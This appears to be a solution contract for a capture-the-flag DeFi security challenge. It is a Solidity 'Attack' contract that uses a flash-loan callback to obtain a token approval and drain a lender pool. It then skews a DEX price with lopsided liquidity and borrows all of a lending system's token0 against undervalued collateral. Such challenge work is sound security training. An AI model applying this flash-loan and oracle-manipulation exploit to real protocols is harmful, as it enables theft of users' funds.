// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../Challenge1/Challenge1.lenderpool.sol";
import "../Challenge2/Challenge2.DEX.sol";
import "./Challenge3.borrow_system.sol";

contract Attack {
    IERC20 public token;
    BorrowSystemInsecureOracle borrow;
    InsecureDexLP dex;
    InSecureumLenderPool pool;
    
    uint256 max;

    constructor(address _borrow, address _dex, address _pool) {
        borrow = BorrowSystemInsecureOracle(_borrow);
        dex = InsecureDexLP(_dex);
        pool = InSecureumLenderPool(_pool);

        max = type(uint256).max;
    }

    // Starts off with doing the same hack on the pool and then swap into the dex. We then add a large amount of 
    // token0 and little amount of token1 as liquidity to the dex. This will drop the price of token0 allowing
    // us to deposit token1 as collateral and borrow all token0 draining it. Finishing it off with removing
    // our liquidity and transfering it out.
    function steal() external {
        pool.flashLoan(address(this), abi.encode(Attack.duringFlash.selector));
        IERC20(pool.token()).transferFrom(address(pool), address(this), IERC20(pool.token()).balanceOf(address(pool)));

        dex.token0().approve(address(dex), max);
        dex.token1().approve(address(dex), max);

        borrow.token0().approve(address(borrow), max);
        borrow.token1().approve(address(borrow), max);

        dex.swap(address(dex.token0()), address(dex.token1()), 100 ether);

        uint256 dexBal0 = dex.token0().balanceOf(address(this));
        uint256 dexBal1 = dex.token1().balanceOf(address(this));

        dex.addLiquidity(dexBal0, 1);

        borrow.depositToken1(borrow.token1().balanceOf(address(this)));
        borrow.borrowToken0(borrow.token0().balanceOf(address(borrow)));

        dex.removeLiquidity(dex.balanceOf(address(this)));

        dex.token0().transfer(msg.sender, dexBal0);
        dex.token1().transfer(msg.sender, dexBal1);
    }

    function duringFlash() external {
        token.approve(msg.sender, max);
    }
}